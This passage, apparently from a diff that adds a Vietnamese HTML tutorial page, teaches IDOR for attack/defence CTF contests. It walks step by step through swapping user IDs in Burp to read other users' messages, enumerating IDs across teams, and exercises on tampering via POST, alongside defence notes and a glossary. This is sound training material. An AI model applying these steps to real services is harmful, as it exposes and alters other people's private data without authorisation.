+  service y hệt). Nếu service không cho tự đăng ký, có thể cần dùng tài khoản mặc định/đã biết trước từ lúc đọc
+  source — IDOR thường yêu cầu <strong>có 1 session hợp lệ bất kỳ</strong>, không nhất thiết phải là session của
+  nạn nhân.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có trang "Tin nhắn của tôi", URL <code>/api/messages/{user_id}</code>, đăng ký được tài khoản tự do.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Đăng ký + xác nhận ID của mình</div><div class="d">Đăng ký tài khoản mới, xem tin nhắn của mình ở <code>/api/messages/42</code> (biết mình là user 42).</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Thử IDOR</div><div class="d">Burp Repeater, đổi <code>42</code> thành <code>1</code> → Response hiện tin nhắn của user khác ⟹ xác nhận IDOR.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Tìm flag</div><div class="d">Duyệt qua nhiều ID (script B mục 08), thấy user có ID đặc biệt (vd 999, "admin") chứa tin nhắn kèm flag.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dùng script (C) mục 08, chạy qua tất cả các đội mỗi round (mỗi đội tự đăng ký tài khoản trên service của chính họ).</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ — KHÁC VỚI CÁC BÀI TRƯỚC</div>
+  <h2>Vì sao IDOR khó chặn bằng WAF</h2>
+  <div class="note warn"><span class="tag">Khác biệt quan trọng</span>Mọi bài trước (SQLi, XSS, LFI...) có
+  <strong>payload bất thường</strong> để WAF nhận diện (dấu nháy, <code>../</code>, thẻ <code>&lt;script&gt;</code>).
+  IDOR <strong>không có payload bất thường</strong> — request <code>GET /api/order/1</code> và
+  <code>GET /api/order/482</code> có cấu trúc giống hệt nhau, chỉ khác 1 con số hợp lệ. WAF (dựa trên pattern
+  payload) <strong>về cơ bản không thể phân biệt</strong> request hợp pháp với request tấn công IDOR.</div>
+  <table>
+    <tr><th>Việc có thể làm qua WAF (hạn chế)</th><th>Hiệu quả</th></tr>
+    <tr><td>Rate-limit số lượng request khác nhau tới cùng 1 route trong thời gian ngắn</td><td>Chặn được kiểu duyệt tuần tự ồ ạt (brute-force ID), không chặn được 1-2 lần dò thủ công</td></tr>
+    <tr><td>Chặn truy cập <code>/admin</code> theo IP cố định</td><td><strong>VI PHẠM quy chế A/D</strong> (cấm chặn theo IP) — không được dùng</td></tr>
+  </table>
+  <p><strong>Phòng thủ thật sự cho IDOR nằm ở sửa logic code</strong> (thêm dòng kiểm tra chủ sở hữu) — nhưng quy
+  chế A/D <strong>không cho sửa source</strong>. Vì vậy IDOR trong A/D gần như <strong>không phòng thủ được bằng
+  WAF</strong>, chỉ có thể hạn chế phần nào bằng rate-limit. Chấp nhận rằng nhóm lỗ hổng này thiên về tấn công hơn
+  phòng thủ.</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không tìm ra IDOR</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Mọi ID khác đều trả 403/404</td><td>App có check quyền đúng (không có IDOR ở endpoint này)</td><td>Thử endpoint khác (file download, API khác, chức năng admin)</td></tr>
+    <tr><td>ID dạng UUID dài, không đoán được</td><td>Thiết kế an toàn hơn — nhưng vẫn có thể lộ UUID nạn nhân qua chỗ khác (danh sách public, thông báo, link chia sẻ)</td></tr>
+    <tr><td>Response giống nhau dù đổi ID (luôn trả về data của chính mình)</td><td>App có thể đang lấy ID từ session, bỏ qua tham số URL hoàn toàn — không phải lỗi, chỉ là tham số đó vô dụng</td></tr>
+    <tr><td>Không có tài khoản nào để đăng nhập thử</td><td>App không cho tự đăng ký</td><td>Kiểm tra lại xem có tài khoản demo/mặc định không (đọc source nếu có), hoặc thử truy cập trực tiếp không cần session (một số route IDOR thậm chí không cần đăng nhập)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng ID công khai/đoán được (số tuần tự, UUID lộ ra chỗ khác) VÀ không kiểm tra chủ sở hữu ở phía server.</td></tr>
+    <tr><td>❌</td><td>App kiểm tra đúng quyền sở hữu mỗi request (<code>if resource.owner_id != current_user.id: abort(403)</code>).</td></tr>
+    <tr><td>❌</td><td>ID là UUID ngẫu nhiên thật sự và không lộ ra bất kỳ đâu (không có danh sách public, không trong URL chia sẻ) — không gian đoán quá lớn để brute-force.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, đăng ký 2 tài khoản, xác nhận IDOR bằng
+  kỹ thuật so sánh 2 session (mục 05).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ thử cả chiều ngược: dùng cookie B gọi ID của A, không chỉ dùng
+  cookie A gọi ID của B.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> endpoint chặn đúng IDOR trên GET nhưng quên chặn trên POST (sửa dữ liệu).
+  Viết request khai thác việc sửa được dữ liệu của người khác.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử method khác nhau trên CÙNG route, không chỉ đổi ID.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> ID là UUID, nhưng bạn tìm thấy 1 endpoint liệt kê public (vd
+  <code>/api/public/leaderboard</code>) có lộ UUID của user khác dưới dạng gián tiếp. Mô tả các bước kết hợp 2
+  lỗ hổng (information disclosure + IDOR) để lấy flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thu thập UUID từ endpoint công khai trước, rồi mới dùng chúng ở
+  endpoint IDOR riêng tư — IDOR không chỉ là "đoán ID", mà còn là "tìm ID ở nơi nó bị lộ".</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>IDOR (Insecure Direct Object Reference)</td><td>Lỗi khi hệ thống dùng ID trực tiếp để truy cập bản ghi mà không kiểm tra quyền sở hữu.</td></tr>
+    <tr><td>Broken Access Control</td><td>Nhóm rộng hơn: mọi lỗi thiếu kiểm tra quyền, kể cả không liên quan trực tiếp tới 1 ID cụ thể.</td></tr>
+    <tr><td>Authentication vs Authorization</td><td>Xác thực ("bạn là ai") khác phân quyền ("bạn được làm gì") — IDOR là lỗi ở vế thứ hai.</td></tr>
+    <tr><td>Function-level access control</td><td>Kiểm tra quyền theo CHỨC NĂNG (route/API) thay vì theo từng bản ghi dữ liệu.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>arjun</code> (đã cài),
+  <code>ffuf</code> (đã cài), <code>~/hoc/CTF/Tools/web/SecLists/Discovery/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Insecure Direct Object References/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("idor-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("idor-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
